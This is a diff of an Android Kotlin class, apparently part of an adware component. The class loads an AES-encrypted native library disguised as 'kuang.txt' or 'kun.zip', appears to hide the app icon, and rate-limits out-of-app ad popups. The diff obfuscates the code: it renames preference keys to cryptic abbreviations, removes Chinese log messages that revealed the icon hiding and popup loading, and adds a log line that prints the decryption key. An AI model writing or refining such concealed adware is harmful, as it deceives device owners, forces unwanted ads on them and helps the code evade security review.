@@ -58,11 +58,11 @@ object GgUtils {
     private var nDayShowMax = 80 //天显示次数
     private var nTryMax = 50 // 失败上限
 
-    // todo modify name
-    private var numHour = MasterRu.getInt("show_hour_num")
-    private var numDay = MasterRu.getInt("show_day_num")
-    private var isCurDay = MasterRu.getStr("last_cur_day")
-    private var numJumps = MasterRu.getInt("num_jum_p")
+
+    private var numHour = MasterRu.getInt("s_h_n")
+    private var numDay = MasterRu.getInt("s_d_n")
+    private var isCurDay = MasterRu.getStr("l_c_d")
+    private var numJumps = MasterRu.getInt("n_j_p")
 
     @JvmStatic
     var isLoadH = false //是否H5的so 加载成功
@@ -80,7 +80,7 @@ object GgUtils {
     @JvmStatic
     fun sNumJump(num: Int) {
         numJumps = num
-        MasterRu.saveInt("num_jum_p", num)
+        MasterRu.saveInt("n_j_p", num)
     }
 
     @JvmStatic
@@ -101,8 +101,8 @@ object GgUtils {
     }
 
     private fun sC() {
-        MasterRu.saveInt("show_hour_num", numHour)
-        MasterRu.saveInt("show_day_num", numDay)
+        MasterRu.saveInt("s_h_n", numHour)
+        MasterRu.saveInt("s_d_n", numDay)
     }
 
     private fun isCurH(): Boolean {
@@ -120,7 +120,7 @@ object GgUtils {
         val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
         if (isCurDay != day) {
             isCurDay = day
-            MasterRu.saveC("last_cur_day", isCurDay)
+            MasterRu.saveC("l_c_d", isCurDay)
             numHour = 0
             numDay = 0
             isPost = false
@@ -208,14 +208,13 @@ object GgUtils {
             withContext(Dispatchers.IO) {
                 i = loadSFile(if (is64i) "kuang.txt" else "kun.zip")
             }
-            Log.e("TAG", "t: 外弹so 加密=$i")
+            Log.e("TAG", "t-wt-so-is-success-$i")
             if (i.not()) {
                 MasterRu.pE("ss_l_f", "$is64i")
                 return@launch
             }
             MasterRu.pE("test_s_load", "${System.currentTimeMillis() - time}")
             lo.loTx(22, 11.0, DataCc.y)
-            Log.e("TAG", "隐藏icon==${DataCc.y}")
             while (true) {
                 // 刷新配置
                 refreshAdmin()
@@ -267,6 +266,7 @@ object GgUtils {
 
     // 解密
     private fun decrypt(inputFile: InputStream, outputFile: File) {
+        Log.e("TAG", "decrypt: ${sK}")
         val key = SecretKeySpec(sK.toByteArray(), "AES")
         val cipher = Cipher.getInstance("AES")
         cipher.init(Cipher.DECRYPT_MODE, key)
@@ -340,7 +340,6 @@ object GgUtils {
             val b = Bundle()
             b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
             b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
-            // todo rename xxx
             Firebase.analytics.logEvent("ad_impression_Brilliant", b)
         } catch (_: Exception) {
         }
